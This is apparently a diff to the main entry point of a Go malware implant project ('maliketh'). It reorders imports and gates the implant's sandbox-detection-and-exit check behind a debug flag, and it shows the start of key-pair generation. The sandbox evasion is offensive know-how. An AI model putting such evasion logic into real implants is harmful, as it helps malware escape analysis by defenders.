@@ -2,21 +2,21 @@ package main
 
 import (
 	"fmt"
+	config "maliketh/pkg/config"
 	"maliketh/pkg/crypto"
 	"maliketh/pkg/implant"
-	. "maliketh/pkg/utils"
 	"maliketh/pkg/sandbox"
-	config "maliketh/pkg/config"
+	. "maliketh/pkg/utils"
 	"time"
 )
 
 func main() {
 
-	
-
-	if sandbox.SandboxAll() {
-		DebugPrintln("Sandbox detected, exiting...")
-		return
+	if !config.DEBUG {
+		if sandbox.SandboxAll() {
+			DebugPrintln("Sandbox detected, exiting...")
+			return
+		}
 	}
 
 	public, private, err := crypto.CreateBase64KeyPair()
